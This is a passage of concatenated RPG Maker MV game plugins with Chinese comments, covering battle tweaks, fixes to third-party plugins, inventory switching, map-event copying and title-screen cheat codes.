		base._createBaseTexture(c);
		console.log("buffIcons concatenated");
	};
	base.addLoadListener(()=>{
		if(base.isReady()) f();
		else buff.addLoadListener(f);
	});
},
]);

})();


﻿"use strict";
/*:
 * @plugindesc 修YEP在選單與戰鬥的技能/道具效果次數不同
 * @author agold404
 * @help 詳細說明
 * 第二行
 * 
 * This plugin can be renamed as you want.
 */

if(typeof Yanfly!=='undefined' && typeof Yanfly.BEC!=='undefined')(()=>{ let k,r,t;

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	$dataSkills.forEach(f.forEach);
	$dataItems.forEach(f.forEach);
	return rtv;
}).ori=r;
(p[k].forEach=function f(it){ if(!it) return;
	it._menuTimes=0;
	f.tbl.forEach(f.forEach,it);
	it._menuTimes*=it.repeats;
	
}).tbl=[
	'setupActions',
	'wholeActions',
	'targetActions',
	'followActions',
	'finishActions',
];
((p[k].forEach.forEach=function f(k){
	if(this[k]) this._menuTimes+=this[k].filter(f.tbl).length;
}).tbl=function f(cmd){
	return cmd[0] && cmd[0].match(f.tbl);
}).tbl=/^ACTION[ ]EFFECT$/i;
}

{ const p=Scene_ItemBase.prototype;
k='applyItem';
r=p[k]; (p[k]=function f(){
	const fe=f.forEach;
	const act=fe.act=new Game_Action(this.user()) , item=fe.item=this.item();
	act.setItemObject(item);
	this.itemTargetActors().forEach(fe,this);
	act.applyGlobal();
}).ori=r;
p[k].forEach=function f(trgt){
	for(let i=0,t=f.item._menuTimes;i<t;++i){
		f.act.apply(trgt);
	}
};
}

})();


﻿"use strict";
/*:
 * @plugindesc 第一下命中ㄉTP + note區寫獲得tp
 * @author agold404
 * @help 詳細說明
 *
 * 道具、技能note區
 * <firstHitTp:數字>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataSkills.forEach(f.forEach);
	$dataItems.forEach(f.forEach);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=it=>{ if(!it) return;
	const meta=it.meta;
	it.firstHitTp=Number(meta.firstHitTp)||0;
	if(meta.tpGain) it.tpGain=Number(meta.tpGain)||0;
};
}

{ const p=Game_Action.prototype;
k='setSubject';
r=p[k]; (p[k]=function f(){
	this._oneTimeTpGained=false;
	return f.ori.apply(this,arguments);
}).ori=r;
k='applyItemUserEffect';
r=p[k]; (p[k]=function f(){
	if(!this._oneTimeTpGained){
		this._oneTimeTpGained=true;
		const fht=this.item().firstHitTp;
		if(fht) this.subject().gainSilentTp(fht);
	}
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 技能、道具使某些狀態擴散到隊伍
 * @author agold404
 * @help note區
 * <diffuseStates:狀態id,用逗號分隔後寫更多狀態id>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataSkills.forEach(f.add_diffuseStates);
	$dataItems.forEach(f.add_diffuseStates);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].add_diffuseStates=dataobj=>{
	const meta=dataobj&&dataobj.meta;
	if(meta && meta.diffuseStates){
		dataobj.diffuseStates=new Set(meta.diffuseStates.split(',').map(Number).filter(Number));
	}
};
}

{ const p=Game_Action.prototype;
/*
k='setSubject';
r=p[k]; (p[k]=function f(){
//	this._oneTimeDiffuseStates=false;
	return f.ori.apply(this,arguments);
}).ori=r;
*/
k='applyItemUserEffect';
r=p[k]; (p[k]=function f(trgt){
//	if(!this._oneTimeDiffuseStates){
//		this._oneTimeDiffuseStates=true;
		const item=this.item();
		if(item.diffuseStates){
			f.tbl.tbl=item.diffuseStates;
			for(let mi=0,members=trgt.friendsUnit().members(),si,stats=trgt.states().filter(f.tbl);mi!==members.length;++mi){
				if(members[mi]!==trgt) for(si=0;si!==stats.length;++si){ const id=stats[si].id;
					members[mi].addState(id);
					members[mi]._stateTurns[id]=trgt._stateTurns[id];
				}
			}
		}
//	}
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=function f(dataobj){ return f.tbl.has(dataobj.id); };
}

})();


﻿"use strict";
/*:
 * @plugindesc 戰鬥開始前事件、戰鬥結束後事件
 * @author agold404
 * @help 是建第一列在註解寫以下單列
 * 註解 @BEFORE
 * 註解 @END
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataTroops.forEach(f.add_battleBeginEndTiming);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].add_battleBeginEndTiming=(dataobj)=>{ if(!dataobj) return;
	dataobj.timing_beg=undefined;
	dataobj.timing_end=undefined;
	for(let pgs=dataobj.pages,p=0;p!==pgs.length;++p){
		// pgs[p].timing_beg=undefined; // non-number-able
		if(!(dataobj.timing_beg>=0)){ for(let cmds=pgs[p].list,c=0;c!==cmds.length;++c){
			if(cmds[c].code===108 && cmds[c].parameters[0]==="@BEFORE"){
				dataobj.timing_beg=p;
				break;
			}
		} }
		// pgs[p].timing_end=undefined; // non-number-able
		if(!(dataobj.timing_end>=0)){ for(let cmds=pgs[p].list,c=0;c!==cmds.length;++c){
			if(cmds[c].code===108 && cmds[c].parameters[0]==="@END"){
				dataobj.timing_end=p;
				break;
			}
		} }
	}
};
}

{ const p=BattleManager;
k='setup';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	const dataobj=$gameTroop.troop();
	const pgid=dataobj.timing_beg;
	if(pgid>=0){
		const itrp=$gameTroop._interpreter;
		itrp.setup(dataobj.pages[pgid].list);
		while(itrp.isRunning()) $gameTroop.updateInterpreter();
		itrp.clear();
	}
	return rtv;
}).ori=r;
k='updateBattleEnd';
r=p[k]; (p[k]=function f(){
	const itrp=$gameTroop._interpreter;
	if(itrp.isRunning()) return $gameTroop.updateInterpreter();
	const dataobj=$gameTroop.troop();
	const pgid = dataobj && dataobj.timing_end ;
	if(pgid>=0 && !$gameTroop._eventFlags[pgid]){
		$gameTroop._eventFlags[pgid]=true;
		itrp.setup(dataobj.pages[pgid].list);
		$gameTroop.updateInterpreter();
		if(itrp.isRunning()) return;
		itrp.clear();
	}
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc blur很慢，MOG_BattleTransitions.js用屁blurㄛ
 * @author agold404
 * @help 亂數絕對不會再blur
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_System.prototype;
k='setTransitionR';
r=p[k]; (p[k]=function(){
	let ch;
	if(this._treType[1] >= 4){
		ch=~~(Math.random()*3);
		ch+=ch>=2;
	}else{ 
		ch = this._treType[1];
	}
	return this._treType[0]=ch;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc MOG_SceneMenu.js選command是不會break膩
 * @author agold404
 * @help 8787
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Scene_Menu.prototype;
k='isOnSprite_cmd';
r=p[k]; (p[k]=function f(sp){
	const w=sp.width,h=sp.height,a=sp.anchor;
	const x=sp.x-a.x*w,y=sp.y-a.y*h;
	if(!sp.visible || !sp.opacity) return false;
	const dx=TouchInput.x-x,dy=TouchInput.y-y;
	if(dy<0||dy>=h) return false;
	const a1=-h/42,b1=h;
	if(f.tbl(a1,b1,dx,dy)>0 || f.tbl(a1,b1,dx-48,dy)<=0) return false;
	// a<0
	return true;	
}).ori=r;
p[k].tbl=function(a,b,px,py){
	// y=ax+b => ax+b-y?
	// point x,y
	return a*px+b-py;
};
k='checkTouchCommand';
r=p[k]; (p[k]=function(){
	for(let i=0;i!==this._commands.length;++i){
		if(this.isOnSprite_cmd(this._commands[i])){
			this.setTouchCommand(i);
			break;
		}
	}
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 修別人ㄉbug: MOG_SceneItem.js
 * @author agold404
 * @help use before it is assigned
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

if(typeof PartyWindowData!=='undefined'){ const p=PartyWindowData.prototype;
k='refreshPar';
r=p[k]; (p[k]=function f(){
	if(!this._par) return;
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 切換背包
 * @author agold404
 * @help 使用javascript
 * $gameParty.selectPack(整數); // 切換成"整數"背包
 * $gameParty.clearPack(整數); // 清空"整數"背包
 * $gameParty.copyToPack(整數A,整數B); // 將"整數B"背包的東西丟進"整數A"背包
 * $gameParty.mergePack(整數A,整數B); // 將"整數B"背包的東西丟進"整數A"背包，"整數B"背包清空
 * $gameParty.swapPack(整數A,整數B); // 將"整數A"背包與"整數B"背包的內容交換
 * 預設背包是0
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_Party.prototype;
p._getPacks=function(){
	return this._packs||(this._packs=[]);
};
p._storePack=function(n){
	this._getPacks()[n]={
		i:this._items,
		w:this._weapons,
		a:this._armors,
		g:this._gold,
	};
};
p._loadPack=function(n){
	const pack=this._getPacks()[n];
	if(pack){
		this._items=pack.i;
		this._weapons=pack.w;
		this._armors=pack.a;
		this._gold=pack.g;
	}else{
		this._items={};
		this._weapons={};
		this._armors={};
		this._gold=0;
	}
};
p.selectPack=function(n){
	n|=0;
	const currId=this._packId|0;
	if(n===currId) return;
	this._storePack(currId);
	this._loadPack(n);
	this._packId=n;
};
p.clearPack=function(n){
	const packs=this._getPacks();
	packs[n|0]=undefined;
	while(packs.length && !packs[packs.length-1]) packs.pop();
};
p.maxItemsPack=function(packId,item){
	// reserved for future use
	return this.maxItems(item);
};
p.maxGoldPack=function(packId){
	// reserved for future use
	return this.maxGold();
};
(p.copyToPack=function f(dst,src){
	dst|=0; src|=0;
	const packs=this._getPacks();
	if(!packs[src]) return;
	const currId=this._packId|0;
	if(dst===currId){
		[['i',$dataItems,this._items,packs[src],dst,],['w',$dataWeapons,this._weapons,packs[src],dst,],['a',$dataArmors,this._armors,packs[src],dst,],].forEach(f.forEach,this);
		this._gold	=Math.min(this.maxGoldPack(dst),this._gold+packs[src].g)||0;
	}else{
		if(!packs[dst]) packs[dst]={i:{},w:{},a:{},};
		[['i',$dataItems,packs[dst].i,packs[src],dst,],['w',$dataWeapons,packs[dst].w,packs[src],dst,],['a',$dataArmors,packs[dst].a,packs[src],dst,],].forEach(f.forEach,this);
		packs[dst].g	=Math.min(this.maxGoldPack(dst),packs[dst].g+packs[src].g)||0;
	}
}).forEach=function(cat){
	for(let k in cat[3][cat[0]]){
		if(!cat[1][k]) continue;
		cat[2][k]|=0;
		cat[2][k]  	=Math.min(this.maxItemsPack(cat[4],cat[1][k]),cat[2][k]+cat[3][cat[0]][k]);
		if(!cat[2][k]) delete cat[2][k];
	}
};
p.mergePack=function(dst,src){
	dst|=0; src|=0;
	if(dst===src) return;
	this.copyToPack(dst,src);
	this.clearPack(src);
};
p.swapPack=function(a,b){
	a|=0; b|=0;
	if(a===b) return;
	const packs=this._getPacks();
	const tmp=packs[a]; packs[a]=packs[b]; packs[b]=tmp;
	if(!packs[a]) delete packs[a];
	if(!packs[b]) delete packs[b];
};
}

})();


﻿"use strict";
/*:
 * @plugindesc 限制道具不能於部分地圖中使用
 * @author agold404
 * @help 限制道具不能於部分地圖中使用
 * note區
 * <disabledInMaps:地圖id>
 * 0開頭叫做8進位ㄛ；0x開頭叫做16進位ㄛ。
 * 半形逗號分隔各個數字。兩逗號間沒數字ㄉ話會當作可在0號地圖
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r;

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataItems.forEach(f.disabledInMaps);
	$dataSkills.forEach(f.disabledInMaps);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].disabledInMaps=(dataobj)=>{
	const meta=dataobj&&dataobj.meta; if(!meta) return;
	if(meta.disabledInMaps){
		dataobj.disabledInMaps=new Set(meta.disabledInMaps.split(',').map(Number));
	}else dataobj.disabledInMaps=undefined;
};
}

{ const p=Game_BattlerBase.prototype;
k='canUse';
r=p[k]; (p[k]=function f(item){
	return !(item && item.disabledInMaps && item.disabledInMaps.has($gameMap._mapId)) && f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 密技喔
 * @author agold404
 * @help ?
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

let currentlyEnabled=false;
const currentlyEnableds={};

Object.defineProperties(Game_System.prototype,{
cheats:{
	get:function(){ return this._cheats?this._cheats:(this._cheats={}); },
	set:function(rhs){ return this._cheats=rhs; },
configurable: true},
});

{ const p=Scene_Title.prototype;
(p._奇蹟之靈999=function f(){
	if(f.tbl===0) f.tbl=$dataItems.find(x=>x&&x.name==="奇蹟之靈");
	if(f.tbl){
		if(!f.tbl._oriMaxStack) f.tbl._oriMaxStack=$gameParty.maxItems(f.tbl);
		if(currentlyEnabled){
			currentlyEnabled=false;
			f.tbl.maxStack=999;
			$gameParty.gainItem(f.tbl,999);
		}else f.tbl.maxStack=f.tbl._oriMaxStack;
	}
}).tbl=0;
p._金手指=function(){
	if(currentlyEnabled){
		currentlyEnabled=false;
		$gameSystem.金手指=true;
	}else $gameSystem.金手指=false;
};
p._更多金手指1=function(kw){
	if(currentlyEnableds[kw]){
		currentlyEnableds[kw]=false;
		$gameSystem.cheats[kw]=true;
	}else $gameSystem.cheats[kw]=false;
};
p._更多金手指=function(){
	if(!$gameSystem.cheats) $gameSystem.cheats={};
	const arr=[]; for(let k in currentlyEnableds) arr.push(k);
	for(let x=0,xs=arr.length;x!==xs;++x) this._更多金手指1(arr[x]);
};
k='terminate';
r=p[k]; (p[k]=function f(){
	Input._onKeyDown.idx=0;
	this._金手指();
	this._更多金手指();
	return f.ori.apply(this,arguments);
}).ori=r;
}

{ const p=Input;
const new金手指=(cond,hit,keys,otherThingsOnTableKVPair,otherThingsOnFunctionKVPair)=>{
const k='_金手指';
const r=p[k];
const t=p[k]=function f(evt){
	if(f.ori) f.ori.apply(this,arguments);
	if(cond.call(this,f)){
		const kc=evt.keyCode;
		if(kc===f.tbl[f.idx]){ if(f.tbl.length===++f.idx){
			hit.call(this,f);
		} }else{
			while(f.idx>=0 && kc!==f.tbl[f.idx]){
				if(f.idx) f.idx=f.sameTo[f.idx-1]+1;
				else f.idx=-1;
			}
			++f.idx;
		}
	}
};
t.ori=r;
t.tbl=keys;
t.sameTo=[-1,];
for(let i=0,x=1,s=t.tbl,st=t.sameTo;x<s.length;){
	if(s[x]===s[i]) st[x++]=i++;
	else{
		if(i) i=st[i-1]+1;
		else st[x++]=-1;
	}
}
t.idx=0;
if(otherThingsOnTableKVPair) for(let k in otherThingsOnTableKVPair) t.tbl[k]=otherThingsOnTableKVPair[k];
if(otherThingsOnFunctionKVPair) for(let k in otherThingsOnFunctionKVPair) t[k]=otherThingsOnFunctionKVPair[k];
}; // new金手指

new金手指(function(f){
	return !currentlyEnabled && SceneManager._scene && SceneManager._scene.constructor===Scene_Title;
},function(f){
	currentlyEnabled=true;
	AudioManager.playMe({name: "Item", volume: 100, pitch: 100});
},[82,190,73,190,80,190,]);

{ const kw='cheat老K的內褲';
new金手指(function(f){
	return !currentlyEnableds[kw] && SceneManager._scene && SceneManager._scene.constructor===Scene_Title;
},function(f){
	currentlyEnableds[kw]=true;
	AudioManager.playSe({name: "男叫1", volume: 75, pitch: 100});
},[79,76,68,75,83,80,65,78,84,83,]);
}

{ const kw='cheat九五的墨鏡';
new金手指(function(f){
	return !currentlyEnableds[kw] && SceneManager._scene && SceneManager._scene.constructor===Scene_Title;
},function(f){
	currentlyEnableds[kw]=true;
	AudioManager.playSe({name: "山神1", volume: 100, pitch: 100});
},[72,69,76,76,79,57,53]);
}

{ const kw='cheat幻影劍環';
new金手指(function(f){
	return !currentlyEnableds[kw] && SceneManager._scene && SceneManager._scene.constructor===Scene_Title;
},function(f){
	currentlyEnableds[kw]=true;
	AudioManager.playSe({name: "Laugh", volume: 100, pitch: 100});
},[87,72,79,65,77,73]);
}

{ const kw='cheat兔耳雷神水壺槌';
new金手指(function(f){
	return !currentlyEnableds[kw] && SceneManager._scene && SceneManager._scene.constructor===Scene_Title;
},function(f){
	currentlyEnableds[kw]=true;
	AudioManager.playSe({name: "GirlLaughing", volume: 100, pitch: 100});
},[54,54,54,65,71,69]);
}

{ const kw='cheat汪汪餃';
new金手指(function(f){
	return !currentlyEnableds[kw] && SceneManager._scene && SceneManager._scene.constructor===Scene_Title;
},function(f){
	currentlyEnableds[kw]=true;
	AudioManager.playSe({name: "Dog", volume: 100, pitch: 100});
},[68, 73, 78, 65]);
}

// common funcs

const always=()=>true,gainLvUpExp=f=>{
	const actr=$gameActors._data[f.actorId];
	if(actr){
		const lv=actr.level;
		actr.changeExp(actr.currentExp()+actr.expForLevel(lv+1)-actr.expForLevel(lv));
		AudioManager.playSe({name:"Powerup",volume:75,pitch:100});
	}else SoundManager.playBuzzer();
},isInMap=f=>SceneManager.isScene_map(),gainItems=f=>{
	if(!f.tbl.items) f.tbl.items=(f.getObjArr&&f.getObjArr()||$dataItems).filter(f.cmp);
	if(f.tbl.items.length){
		AudioManager.playSe(f.se);
		for(let x=0,arr=f.tbl.items;x!==arr.length;++x) $gameParty.gainItem(arr[x],f.gainAmount);
	}
},canGain=f=>(f.getObjArr&&f.getObjArr()||$dataItems)&&$gameParty&&!isInDlc(),varEditTry=f=>{
	const tmp=$dataSystem.variables.filter(f.cmp);
	if(tmp.length) AudioManager.playSe(f.se);
},canEditVar=()=>$gameVariables,isInDlc=()=>{
	const mapId=$gameMap&&$gameMap.mapId();
	return mapId<600 && mapId>=500;
};

// gain

new金手指(canGain,gainItems,[76,70,50,190,78,69,84,],undefined,{
cmp:dataobj=>{
	const rtv=dataobj&&dataobj.description&&dataobj.name.indexOf("白粉")>=0;
	if(rtv){
		dataobj.maxStack=9999;
		dataobj.price=1e11;
	}
	return rtv;
},
se:{name: "Ice4", volume: 75, pitch: 100},
gainAmount:DateNow<TR303?1:9999,
});
new金手指(canGain,gainItems,[65,71,79,76,68,52,48,52,],undefined,{
cmp:dataobj=>dataobj&&dataobj.description&&dataobj.name&&( 
	dataobj.name.indexOf("黃金ㄉ魔法書")>=0||
	!Utils.isOptionValid('test')&&(
		dataobj.name==="開鎖勾"||
		(0&&dataobj.occasion^3)||
		((window._agold404_cheatFilter instanceof Function)&&window._agold404_cheatFilter(dataobj))
	)
),
se:{name: "Magic1", volume: 75, pitch: 100},
gainAmount:DateNow<TR404?1:9999,
});
if(0)new金手指(canGain,gainItems,[53,53,53,53,53,53,53,53,53,53,],undefined,{
cmp:dataobj=>dataobj&&dataobj.description&&dataobj.name.indexOf("箭矢")>=0,
se:{name: "Attack3", volume: 75, pitch: 100},
gainAmount:99,
});
if(0)new金手指(canGain,gainItems,[79,76,68,75,83,80,65,78,84,83],undefined,{
cmp:dataobj=>dataobj&&dataobj.description&&dataobj.name.indexOf("老K的內褲")>=0, // 636
se:{name: "男叫1", volume: 75, pitch: 100},
gainAmount:1,
getObjArr:()=>$dataArmors,
});

// var

new金手指(canEditVar,varEditTry,[73,76,79,86,69,89,79,85,65,78,71,69,76,67,65,75,69],undefined,{
cmp:(s,i)=>s&&s.indexOf("好感")>=0&&($gameVariables.setValue(i,$gameVariables.value(i)+10)||true),
se:{name: "Applause1", volume: 75, pitch: 100},
});
new金手指(canEditVar,varEditTry,[72,65,82,84,72,69,65,82,84,72,79,84],undefined,{
cmp:(s,i)=>s&&s.indexOf("技能之心")>=0&&($gameVariables.setValue(i,8)||true),
se:{name: "Up2", volume: 75, pitch: 100},
});

// lv up

if(0){
new金手指(isInMap,gainLvUpExp,[76, 79, 86, 69, 67, 65, 78, 68, 89],undefined,{
actorId:4,
gainLvUpExp:gainLvUpExp,
});
new金手指(isInMap,gainLvUpExp,[83, 77, 71, 73, 82, 76],undefined,{
actorId:5,
gainLvUpExp:gainLvUpExp,
});
}

// mixed/others

// END

new cfc(Input).add('_onKeyDown',function f(evt){
	this._金手指(evt);
	return f.ori.apply(this,arguments);
});
}

})();


﻿"use strict";
/*:
 * @plugindesc map onloadB64C
 * @author agold404
 * @help <onload:...> <onloadB64C:...>
 * LZString.compressToBase64
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(DataManager).add('onLoad_after_map',function f(obj){
	if(obj.meta.onload) eval(obj.meta.onload);
	if(obj.meta.onloadB64C) eval(LZString.decompressFromBase64(obj.meta.onloadB64C));
});

})();


﻿"use strict";
/*:
 * @plugindesc MOG到底4會ㄅ會寫la - 選單恢復成到底可循環
 * @author agold404
 * @help 到底是我拿到劣質版，還是寫MOG插件的人根本在亂寫啊
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Window_MenuCommand.prototype;
k='processCursorMove';
r=p[k]; (p[k]=function(){
	if(this.isCursorMovable()){
		const lastIndex = this.index();
		if(Input.isRepeated('down') || Input.isRepeated('right')){
			this.cursorDown( Input.isTriggered('down') || Input.isTriggered('right') );
		}
		if(Input.isRepeated('up') || Input.isRepeated('left')){
			this.cursorUp( Input.isTriggered('up') || Input.isTriggered('left') );
		}
		if(this.index() !== lastIndex){
			SoundManager.playCursor();
		}
        }
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 電競tp
 * @author agold404
 * @help 轉吧轉吧七彩ㄉtp
 * 
 * This plugin can be renamed as you want.
 */

if(typeof Battle_Hud!=='undefined')(()=>{ let k,r,t;

{ const p=Battle_Hud.prototype;

{
const frmCnt=60;
const rainbow_sep=frmCnt*3.75,rainbow_min=frmCnt*3,rainbow_max=frmCnt*4.5;
k='update_tp_blink';
r=p[k]; (p[k]=function f(){
	if(!this._btlrTpSkills) return;
	if(this._tp_recommendRate){
		if(this._tp_recommendRate<0){
			// 電競tp
			if(!(this._tpBlinkCtr>=rainbow_min)) this._tpBlinkCtr=rainbow_min;
			if(++this._tpBlinkCtr>=rainbow_max ) this._tpBlinkCtr=rainbow_sep;
		}else{
			this._tpBlinkCtr|=0;
			if(++this._tpBlinkCtr>=frmCnt*3) this._tpBlinkCtr=0;
		}
	}else this._tpBlinkCtr=0;
	this._tp_number.forEach(f.forEach,f.tbl[~~(this._tpBlinkCtr/frmCnt)].call(this));
}).ori=r;
p[k].forEach=function(sp){
	sp._tint=0xFFFFFF&((0xFF&(this>>16))|(0xFF00&this)|(this<<16));
	sp._tintRGB=this;
};
p[k].tbl=[
function(){ // emphasize
	let val=0xFF-~~(this._tp_recommendRate*this._tpBlinkCtr/frmCnt);
	val|=val<<8;
	val<<=8;
	return val|0xFF;
},
function(){ // recover
	let val=0xFF-~~(this._tp_recommendRate*((frmCnt<<1)-this._tpBlinkCtr)/frmCnt);
	val|=val<<8;
	val<<=8;
	return val|0xFF;
},
function(){ // hold recovered
	return 0xFFFFFF;
},
];
t=function f(){
	let rtv=0;
	if(this._tpBlinkCtr<rainbow_sep){
		const r=(this._tpBlinkCtr-rainbow_min)/(rainbow_sep-rainbow_min)*f.tbl[3];
		if(r>=f.tbl[2]){
			//rtv<<=8;
			rtv|=~~(0xFF*(Math.cos(r+f.tbl[1])+1)*0.5);
		}
		if(r>=f.tbl[1]){
			rtv<<=8;
			rtv|=~~(0xFF*(Math.cos(r+f.tbl[2])+1)*0.5);
		}
		rtv<<=8;
		rtv|=~~(0xFF*(Math.cos(r)+1)*0.5);
	}else{
		const r=(this._tpBlinkCtr-rainbow_sep)/(rainbow_max-rainbow_sep)*f.tbl[3];
		//rtv<<=8;
		rtv|=~~(0xFF*(Math.cos(r+f.tbl[1])+1)*0.5);
		rtv<<=8;
		rtv|=~~(0xFF*(Math.cos(r+f.tbl[2])+1)*0.5);
		rtv<<=8;
		rtv|=~~(0xFF*(Math.cos(r)+1)*0.5);
	}
	return rtv;
};
t.tbl=[0,Math.PI*2/3,Math.PI*2*2/3,Math.PI*2,];
for(let x=3,xs=~~(rainbow_max/frmCnt);x<=xs;++x) p[k].tbl[x]=t;
}

k='update_tp';
r=p[k]; (p[k]=function f(){
	if(this._btlrTpSkills && this._btlrTpSkills.length) this.update_tp_blink();
	return f.ori.apply(this,arguments);
}).ori=r;

k='refresh_number';
r=p[k]; (p[k]=function f(spv,num){
	if(this._tp_number===spv){
		if(!this._btlrTpSkills){
			this._btlrTpSkills=this._battler.skills().filter(f.filter1);
		}
		if(this._btlrTpSkills.length){
			if(num>=100) this._tp_recommendRate=-1;
			else{
				this._tp_recommendRate=~~((0xFF-f.pad)*Math.min(1,this._btlrTpSkills.filter(f.filter2,this._battler).length/this._btlrTpSkills.length));
				if(this._tp_recommendRate) this._tp_recommendRate+=f.pad;
			}
		}
	}
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].filter1=s=>s.tpCost>0;
p[k].filter2=function(skillObj){ return this.canPaySkillCost(skillObj); };
p[k].pad=64;

}

})();


﻿"use strict";
/*:
 * @plugindesc 減少YEPㄉN平方時間複雜度為2N
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

if(typeof Yanfly!=='undefined' && Yanfly.BSC && Yanfly.BSC.Window_Base_drawActorIcons)(()=>{ let k,r,t;

{ const p=Window_Base.prototype;
let tmpStat;
k='drawActorIconsTurns';
r=p[k]; (p[k]=function f(actr){
	const r=actr.states;
	tmpStat=actr.states();
	actr.states=f.states;
	const rtv=f.ori.apply(this,arguments);
	actr.states=r;
	return rtv;
}).ori=r;
p[k].states=()=>tmpStat;
}

})();


﻿"use strict";
/*:
 * @plugindesc 狀態時間到時(=因回合or行動而結束)，變成一個或多個狀態
 * @author agold404
 * @help linked list
 * 狀態note區<addStats_rmByTime:狀態id,狀態id,狀態id,...>
 * 
 * Game_Battler.prototype.updateStateTurns
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_Battler.prototype;

k='removeState';
r=p[k]; (p[k]=function f(){
	const dataobj=this._addStats_rmByTime && $dataStates[arguments[0]];
	if(dataobj){
		const info = dataobj && dataobj.meta.addStats_rmByTime;
		if(info){
			if(!dataobj.addStats_rmByTime) dataobj.addStats_rmByTime=info.split(',').filter((x,i,a)=>a[i]-=0);
			dataobj.addStats_rmByTime.forEach(f.forEach,this._addStats_rmByTime);
		}
	}
	const rtv=f.ori.apply(this,arguments);
	return rtv;
}).ori=r;
p[k].forEach=function(id){ const n=id-0; n && this.push(n); };

t=function(id){ this.addState(id); };
k='updateStateTurnTiming';
r=p[k]; (p[k]=function f(){
	this._addStats_rmByTime=[];
	const rtv=f.ori.apply(this,arguments);
	const arr=this._addStats_rmByTime;
	this._addStats_rmByTime=undefined;
	if(arr) arr.forEach(f.forEach,this);
	return rtv;
}).ori=r;
p[k].forEach=t;
k='updateStateTurns';
r=p[k]; (p[k]=function f(){
	this._addStats_rmByTime=[];
	const rtv=f.ori.apply(this,arguments);
	const arr=this._addStats_rmByTime;
	this._addStats_rmByTime=undefined;
	if(arr) arr.forEach(f.forEach,this);
	return rtv;
}).ori=r;
p[k].forEach=t;

}

})();


﻿"use strict";
/*:
 * @plugindesc 幫 PKD_SimpleQuestSystem.js 新增箭頭總開關
 * @author agold404
 * @help 記錄在 $gameSystem 裡面ㄛ
 * 
 * $gameSystem._hideSQSQuestArrow = true; // true-like // 隱藏
 * $gameSystem._hideSQSQuestArrow = false; // false-like // 不隱藏
 * 
 * This plugin can be renamed as you want.
 */

if(typeof SQSQuestArrow!=='undefined')(()=>{ let k,r,t;

{ const p=SQSQuestArrow.prototype;
k='update';
r=p[k]; (p[k]=function f(){
	this.visible = !$gameSystem._hideSQSQuestArrow && !$gamePlayer.isTransparent();
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 複製事件
 * @author agold404
 * @help $gameMap.cpevt(id,x,y);
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_System.prototype;
p.cpevt_loadevt=function(mapid){
	if(!this._cpevt) this._cpevt={ mapid:0 , evts:[] , };
	if(this._cpevt.mapid!==mapid){
		this._cpevt.mapid=mapid;
		this._cpevt.evts.length=0;
	}
	for(let x=0,arr=this._cpevt.evts;x!==arr.length;++x) $dataMap.events[arr[x].id]=arr[x];
	$gameSystem._cpevted=1;
};
}

{ const p=Game_Map.prototype;
k='setup';
r=p[k]; (p[k]=function f(mapid){
	$gameSystem.cpevt_loadevt(mapid);
	return f.ori.apply(this,arguments);
}).ori=r;
};

{ const p=Scene_Map.prototype;
k='onMapLoaded';
r=p[k]; (p[k]=function f(){
	$gameSystem._cpevted=undefined;
	return f.ori.apply(this,arguments);
}).ori=r;
k='createDisplayObjects';
r=p[k]; (p[k]=function f(){
	if(!$gameSystem._cpevted) $gameSystem.cpevt_loadevt($gameMap._mapId);
	$gameSystem._cpevted=undefined;
	return f.ori.apply(this,arguments);
}).ori=r;
}

{ const p=Game_Map.prototype;
p.cpevt=function f(evtid,x,y){
	// return new event's id
	const evtds=$dataMap.events;
	if(!evtds[evtid]) return; // no such event
	let newid=evtds.length|0; while(this._events[newid]) ++newid;
	{
		const newobjd=JSON.parse(JSON.stringify(evtds[evtid]));
		newobjd.id=newid;
		newobjd.x=x;
		newobjd.y=y;
		evtds[newid]=newobjd;
		$gameSystem._cpevt.evts.push(newobjd);
	}
	const newevt=new Game_Event(this._mapId,newid);
	this._events[newid]=newevt;
	let sc=SceneManager._scene,sp;
	if(sc.constructor===Scene_Map && (sp=sc._spriteset)){
		const spc=new Sprite_Character(newevt);
		sp._characterSprites.push(spc);
		sp._tilemap.addChild(spc);
	}
